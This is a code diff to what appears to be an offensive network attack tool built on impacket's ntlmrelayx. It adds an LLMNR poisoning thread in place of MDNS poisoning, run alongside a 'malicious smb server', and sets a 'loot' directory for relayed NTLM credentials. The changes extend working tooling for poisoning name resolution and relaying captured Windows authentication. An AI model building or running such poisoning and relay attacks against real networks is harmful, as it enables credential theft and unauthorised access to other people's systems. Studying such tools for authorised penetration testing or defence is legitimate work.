@@ -7,7 +7,7 @@ from impacket.examples.ntlmrelayx.clients.smbrelayclient import SMBRelayClient
 from impacket.examples.ntlmrelayx.attacks.smbattack import SMBAttack
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
-from .Poison import MDNS
+from .Poison import MDNS, LLMNR
 from multiprocessing import Process, Manager
 from threading import Thread
 import sys
@@ -91,9 +91,12 @@ class SmbServerAttack(CommandSet):
 
     def __components_to_launch(self):
         """[ Method to launch the poisoner and malicious smb server ]"""
-        mdns_thread = Thread(target=self.__mdns_poisoner.start_mdns_poisoning)
-        mdns_thread.daemon = True
-        mdns_thread.start()
+        # mdns_thread = Thread(target=self.__mdns_poisoner.start_mdns_poisoning)
+        # mdns_thread.daemon = True
+        # mdns_thread.start()
+        llmnr_thread = Thread(target=self.__llmnr_poisoner.start_llmnr_poisoning)
+        llmnr_thread.daemon = True
+        llmnr_thread.start()
 
         self.__smbserver.start_malicious_smbserver()
 
@@ -141,6 +144,13 @@ class SmbServerAttack(CommandSet):
             self._cmd.INTERFACE,
             self._cmd.info_logger,
         )
+        self.__llmnr_poisoner = LLMNR(
+            self._cmd.LHOST,
+            self._cmd.IPV6,
+            self._cmd.MAC_ADDRESS,
+            self._cmd.INTERFACE,
+            self._cmd.info_logger,
+        )
 
         self.__smbserver = MaliciousSmbServer(
             self._cmd.LHOST,
@@ -155,8 +165,8 @@ class SmbServerAttack(CommandSet):
     def __checking_conditions_for_attack(self, args: argparse.Namespace) -> bool:
         """[ Method to check attack options ]
 
-           Args:
-                args (argparse.Namespace): [ Arguments passed to the attack ]
+        Args:
+             args (argparse.Namespace): [ Arguments passed to the attack ]
         """
         if args.end_attack:
             self.__ends_process_in_the_background()
@@ -397,6 +407,8 @@ class NtlmRelay(CommandSet):
             protocolClients=self.__clients,
         )
         self.__config = NTLMRelayxConfig()
+
+        self.__config.setLootdir("loot")
         self.__config.setMode("RELAY")
         self.__config.target = target
         self.__config.setAttacks(self.__attacks)
